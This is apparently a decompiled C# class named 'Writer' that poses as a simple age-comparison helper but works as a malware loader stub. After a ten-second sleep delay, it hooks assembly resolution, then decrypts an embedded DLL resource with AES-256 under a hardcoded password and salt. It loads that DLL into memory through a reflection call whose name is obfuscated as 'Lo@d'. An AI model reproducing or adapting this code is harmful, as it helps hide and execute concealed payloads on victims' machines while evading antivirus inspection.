using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Sgecrqkdlakmmtdi;

namespace SJSJF_002D3.Mappers;

internal class Writer
{
	private int attr = 0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private string m_Serializer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private int bridge;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private static byte[] m_Token;

	[SpecialName]
	[CompilerGenerated]
	public string RateServer()
	{
		return _Ref;
	}

	[SpecialName]
	[CompilerGenerated]
	public void StopServer(string param)
	{
		_Ref = param;
	}

	[SpecialName]
	[CompilerGenerated]
	public string InvokeServer()
	{
		return m_Serializer;
	}

	[SpecialName]
	[CompilerGenerated]
	public void ResolveServer(string last)
	{
		m_Serializer = last;
	}

	[SpecialName]
	[CompilerGenerated]
	public int SelectServer()
	{
		return bridge;
	}

	[SpecialName]
	[CompilerGenerated]
	public void CompareServer(int value_ID)
	{
		bridge = value_ID;
	}

	[SpecialName]
	[CompilerGenerated]
	private static byte[] LogoutServer()
	{
		return m_Token;
	}

	[SpecialName]
	[CompilerGenerated]
	private static void QueryServer(byte[] asset)
	{
		m_Token = asset;
	}

	[SpecialName]
	[CompilerGenerated]
	private static byte[] OrderServer()
	{
		return _Interpreter;
	}

	[SpecialName]
	[CompilerGenerated]
	private static void IncludeServer(byte[] res)
	{
		_Interpreter = res;
	}

	public Writer(string first, string cont, int cHigh)
	{
		while (attr != 10)
		{
			Thread.Sleep(1000);
			attr++;
		}
		AppDomain.CurrentDomain.AssemblyResolve += DeleteServer;
		StopServer(first);
		QueryServer(new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		ResolveServer(cont);
		CompareServer(cHigh);
		IncludeServer(Encoding.UTF8.GetBytes("Qpiilrztcoajwytmlbpaugg"));
	}

	private Assembly FindServer(object[] first)
	{
		string name = "Lo@d".Replace("@", "a");
		if (first.Length < 2)
		{
			return (Assembly)typeof(Assembly).InvokeMember(name, BindingFlags.InvokeMethod, null, AppDomain.CurrentDomain, first);
		}
		return null;
	}

	public byte[] CalcServer(byte[] item)
	{
		using MemoryStream res = new MemoryStream();
		return SetupServer(res, item);
	}

	private Assembly DeleteServer(object item, ResolveEventArgs pol)
	{
		if (pol.Name.Contains("Sgecrqkdlakmmtdi"))
		{
			using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Odliqpcdz.Sgecrqkdlakmmtdi.dll"))
			{
				byte[] array = new byte[stream.Length];
				stream.Read(array, 0, array.Length);
				object[] first = new object[1] { CalcServer(array) };
				return FindServer(first);
			}
		}
		return null;
	}

	public string UpdateServer(Writer param)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		ClassLibrary val = new ClassLibrary();
		if (SelectServer() == param.SelectServer())
		{
			return "the same age as";
		}
		val.Data();
		return (SelectServer() > param.SelectServer()) ? "older than" : "younger than";
	}

	private byte[] SetupServer(MemoryStream res, byte[] col)
	{
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(OrderServer(), LogoutServer(), 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(res, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(col, 0, col.Length);
			cryptoStream.Close();
		}
		return res.ToArray();
	}
}
